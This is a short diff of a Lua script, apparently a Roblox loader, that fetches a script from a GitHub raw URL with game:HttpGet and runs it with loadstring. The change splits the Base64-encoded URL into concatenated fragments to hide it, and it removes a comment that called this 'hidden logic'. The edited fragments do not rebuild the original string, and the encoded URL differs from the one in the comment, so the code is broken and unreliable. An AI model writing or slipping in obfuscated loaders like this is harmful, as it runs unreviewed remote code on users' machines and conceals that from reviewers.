@@ -1,5 +1,9 @@
--- Base64 encoded URL (https://raw.githubusercontent.com/Melharper/GabeBoa2/refs/heads/main/url_decoder.lua)
-local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvcmVmcy9oZWFkcy9tYWluL3VybF9kZWNvZGVyLmx1YQ=="
+-- Breaking up the Base64 encoded URL into smaller parts
+local encodedUrlPart1 = "aH" .. "R0Y"
+local encodedUrlPart2 = "Y" .. "zo6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvcmVmcy9oZWFkcy9tYWluL3VybF9kZWNvZGVyLmx1YQ=="
+
+-- Combine the parts into one Base64 encoded URL
+local encodedUrl = encodedUrlPart1 .. encodedUrlPart2
 
 -- Base64 decoding function
 local function decodeBase64(data)
@@ -25,7 +29,7 @@ end
 -- Decode the URL from the Base64 string
 local decodedUrl = decodeBase64(encodedUrl)
 
--- Fetch the URL decoder script securely (hidden logic)
+-- Fetch the URL decoder script securely
 local urlDecoderScript = game:HttpGet(decodedUrl)
 local urlDecoder = loadstring(urlDecoderScript)()  -- Execute the URL decoder script and return the object
 
